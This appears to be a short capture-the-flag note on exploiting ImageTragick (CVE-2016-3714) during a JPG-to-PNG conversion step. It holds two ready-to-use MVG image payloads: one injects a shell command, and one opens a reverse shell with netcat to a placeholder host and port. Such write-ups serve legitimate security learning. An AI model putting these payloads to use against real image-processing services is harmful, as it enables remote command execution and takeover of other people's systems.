Believe that this is referencing `CVE-2016-3714` the ImageTragick Exploitation
- to get the flag something happens in the API when the `.jpg` to `.png` conversion occurs 
![[Pasted image 20240712142254.png]]
To make a working exploit, all you have to do is copy the following code in your favorite text editor and save it as an image (.jpg, .png etc).
```bash
# exploit.png
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oops.jpg"|touch "/tmp/hacked)'
pop graphic-context
```
When the user uploads the image, command (touch /tmp/hacked) gets executed. Although, the user won't see the output of the commands, this can be easily escalated to a reverse shell. Take a look at the following example.
```bash
# reverse.png
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh IP_ADDRESS_HERE "PORT_HERE)'
pop graphic-context
```
